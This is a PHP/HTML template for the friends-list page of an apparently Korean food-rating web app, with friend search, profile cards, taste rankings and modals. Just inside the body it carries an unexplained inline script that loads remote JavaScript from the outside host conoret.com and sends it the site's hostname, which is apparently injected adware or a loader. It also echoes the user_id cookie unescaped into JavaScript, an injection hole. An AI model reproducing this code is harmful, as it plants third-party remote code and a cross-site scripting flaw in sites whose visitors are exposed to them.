<!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <?php
    include 'script/modules/LayoutHandler.php';
    (LayoutHandler::factory())->createTitle('친구 목록');
    ?>

    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
    </style>
    <link href="./css/friends.css" rel="stylesheet">
    <link href="./css/footer.css" rel="stylesheet">

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">
        const userId=<?php echo $_COOKIE['user_id']; ?>

        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;
        mql.addListener(function(e) {
            if(e.matches) {
                // 모바일
                flag = true
            } else {
                // 데스크탑
                flag=false
            }
        });

        let id= <?php echo $_COOKIE['user_id']?>

        let request_format=``
        let userIds=[]
        let friendInfo={}

        let friendAddInfo={}
        let friendId
        let search_res
    </script>
    <script type="text/javascript" src="/script/javascript/friends.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();

</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">
    <?php (LayoutHandler::factory())->createFriendsHeader(); ?>

    <main role="main" class="inner cover d-flex" id="rating" >
        <div class="p-3 bg-light card" id="friend-layout">
            <div class="input-group mb-3">
                <input type="text" class="form-control" placeholder="코드 입력" aria-label="Recipient's username" aria-describedby="button-addon2" id="friendInputInfo">
                <button class="btn btn-outline-secondary" type="button" value="친구 추가" onclick="searchFriend()" data-bs-toggle="modal" data-bs-target="#friendSearchModal">Button</button>
            </div>
            <div class="friends-placeholders">
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                    <div class="img-box" style="display: inline-block; margin: 0;">
                        <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                    </div>
                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                            <span class="placeholder col-5"></span>
                        </div>
                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                            <span class="placeholder col-10 placeholder-lg"></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="card" id="friend-info-left" style="margin: auto; height: 100%">
            <div>
                <div id="preview" class="img-box-friend col align-self-center" style="">
                    <img src="/src/Portrait_Placeholder.png" id="friend-image" class="card-img-top" alt="..." style="width: 100%;">
                </div>
            </div>

            <div class="card-body">
                <h5 class="card-title" id="friend-nickname"></h5>
                <p class="card-text">ssosso.table</p>
                <div id="high-rating">
                    <span style="display:block;">높은 점수를 준 음식들</span>
                    <div id="high-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                    </div>
                </div>
                <div id="low-rating" >
                    <span style="display:block;">낮은 점수를 준 음식들</span>
                    <div id="low-rating-holder" class="placeholder-glow" style="overflow-x: auto;">
                    </div>
                </div>

            </div>
        </div>
        <div class="card d-flex flex-columns" id="friend-info-right" style="">
            <span class="card-title" style="display: block">음식 취향 순위</span>
            <div class="placeholder-glow">
                <div class="card-img-top" id="taste-list" style="">
                </div>
            </div>
            <span class="card-title" style="display: block">나와의 취향 차이</span>
            <div class="placeholder-glow">
                <div class="card-img-top" id="taste-diff-list" style="">
                </div>
            </div>
            <ul class="card list-group list-group-flush">
                <li class="list-group-item" style="padding:0;">
                    <input type="button" value="평가한 음식" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" data-bs-toggle="modal" data-bs-target="#myFoodModal" style="width:100%;">
                </li>
                <li class="list-group-item" style="padding:0;">
                    <input type="button" value="다이어리 보기" class="btn" style="background-color:#e4bd74; color:white; width: 100%;" onclick="show_diary()">
                </li>
            </ul>
        </div>
        <!-- Button trigger modal -->

        <!-- Modal -->
        <div id="modal-layout">
            <div class="modal fade" id="myFoodModal" tabindex="-1" aria-labelledby="myFoodModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="myFoodModalLabel"></h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="scroll-layout-rating">
                            <div class="rating-placeholders">
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                                <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                    <div style="display: inline-block; margin: 0;">
                                        <img src="/src/food_placeholder.png" height="60" width="60">
                                    </div>
                                    <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                        <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                            <span class="placeholder col-5"></span>
                                        </div>
                                        <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                            <span class="placeholder col-10 placeholder-lg"></span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">닫기</button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Modal -->
            <div class="modal fade" id="friendRequestModal" tabindex="-1" aria-labelledby="friendRequestModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title" id="friendRequestModalLabel">친구 요청</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="friend-request">

                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Modal -->
            <div class="modal fade" id="friendSearchModal" tabindex="-1" aria-labelledby="friendSearchModalLabel" aria-hidden="true">
                <div class="modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h1 class="modal-title fs-5" id="friendSearchModalLabel">검색 결과</h1>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                        </div>
                        <div class="modal-body" id="friend-modal-body" style="max-height: 500px; overflow-y: auto;">
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                            <div style="height: 120px;" class="list-group-item list-group-item-action py-3 lh-tight d-flex align-items-center" aria-current="true">
                                <div class="img-box" style="display: inline-block; margin: 0;">
                                    <img class="friend-img" src="/src/Portrait_Placeholder.png" height="80" width="80">
                                </div>
                                <div style="width:300px; display: inline-block; margin: 0 0 0 20px;" class="rating_content">
                                    <div class="placeholder-glow d-flex justify-content-start fs-3" style="">
                                        <span class="placeholder col-5"></span>
                                    </div>
                                    <div class="placeholder-glow d-flex justify-content-start fs-2" style="margin:10px 0 0 0">
                                        <span class="placeholder col-10 placeholder-lg"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>

    <?php (LayoutHandler::factory())->createFooter(); ?>
</div>

</body>
<script>
    init()
</script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
</html>